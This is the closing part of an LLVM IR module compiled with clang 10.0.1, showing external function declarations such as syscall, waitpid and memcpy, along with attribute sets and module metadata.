declare dso_local i32 @syscall(i32, i32, i32, i32, i32, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @waitpid(i64, i32*, i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
